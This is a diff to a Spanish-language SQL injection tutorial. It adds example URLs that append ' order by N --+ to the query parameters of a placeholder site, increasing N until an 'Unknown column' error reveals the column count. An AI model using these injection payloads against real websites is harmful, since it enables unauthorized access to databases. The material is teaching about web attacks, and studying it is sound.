@@ -99,7 +99,25 @@ Imaginamos que la pagina tiene `23` columnas, volviendo al ejemplo anterior en d
 
 -http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 2 --+ #sin error
 
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 3 --+ #sin error
+
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 10 --+ #sin error
+
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 20 --+ #sin error
+
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 23 --+ #sin error
+
+-http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' order by 24 --+ #tenemos un error
+
 ```
+
+Al nosotros sobrepasar el número de columnas usadas por la página, esta nos mostrara un error como el siguiente: 
+
+`La consulta no se realizo: Unknown column '24' in 'order clause'`
+
+
+
+
 
 
 ## Inyección sql automatizada con sqlmap
